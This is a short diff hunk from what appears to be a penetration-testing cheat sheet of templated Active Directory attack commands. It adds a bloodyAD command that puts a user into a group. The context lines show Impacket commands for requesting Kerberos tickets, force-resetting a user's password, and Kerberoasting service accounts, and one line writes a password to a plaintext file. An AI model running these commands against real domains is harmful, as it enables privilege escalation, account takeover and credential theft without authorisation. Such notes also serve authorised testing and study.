@@ -362,6 +362,8 @@ TGT=$(impacket-getTGT $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET | grep -oP '(?
 
 impacket-changepasswd -dc-ip $TARGET $DOM/'$USERNAME'@$TARGET -newpass '123qweasdF!' -altuser '$USERNAME' -altpass '$PASSWORD' -p kpasswd -reset
 
+bloodyAD --dc-ip $TARGET -d '$DOM' -u '$USERNAME' -p '$PASSWORD' add groupMember 'GROUP' 'USER'
+
 ST='cifs/$DC'; F=$(impacket-getST $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -spn $ST | grep -oP '(?<=\[\*\] Saving ticket in ).*'); echo "[*] Saving ticket in $F"; export KRB5CCNAME="$F"; chmod 0600 "$F"; echo '$PASSWORD' > kpassfile; kinit --password-file='kpassfile' -c "$KRB5CCNAME" '$USERNAME@$KRB5DOM'; klist
 
 impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request
